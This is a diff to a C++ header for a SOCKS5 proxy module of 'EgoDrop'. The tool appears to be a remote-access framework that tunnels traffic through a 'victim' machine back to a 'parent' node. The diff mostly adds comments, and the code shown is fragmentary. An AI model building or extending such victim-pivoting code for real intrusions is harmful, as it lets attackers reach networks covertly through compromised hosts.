@@ -1,3 +1,13 @@
+/*
+Name: EgoDrop SOCKS5 proxy module.
+Author: iss4cf0ng/ISSAC
+
+Description:
+    Establish SOCKS5 tunnel between parent machine and target host and forwarding network stream.
+*/
+
+#pragma once
+
 #include <iostream>
 #include <unistd.h>
 #include <arpa/inet.h>
@@ -28,8 +38,10 @@ private:
     std::thread m_thdVictim;
 
 public:
+    //Constructor
     clsProxySocks5() = default;
 
+    //Constructor
     clsProxySocks5(std::shared_ptr<clsVictim> victim, int nStreamId, std::string& szIPv4, int nPort)
     {
         m_vicParent = victim;
@@ -50,6 +62,7 @@ public:
 
     }
 
+    //Open proxy adapter.
     bool fnbOpen()
     {
         addrinfo hints{}, *res = nullptr;
@@ -92,6 +105,7 @@ public:
         return true;
     }
 
+    //Close socket.
     void fnClose()
     {
         if (!m_bIsRunning.exchange(false))
@@ -126,6 +140,7 @@ public:
         return true;
     }
 
+    //Forwarding network stream buffer.
     void fnForwarding(std::vector<uint8_t>& abBuffer)
     {
         if (!m_bIsRunning || m_nSkt < 0)
@@ -138,6 +153,7 @@ public:
         }
     }
 
+    //Receive data from remote and redirect it to the parent node.
     void fnRecvFromVictim()
     {
         uint8_t abBuffer[8192];
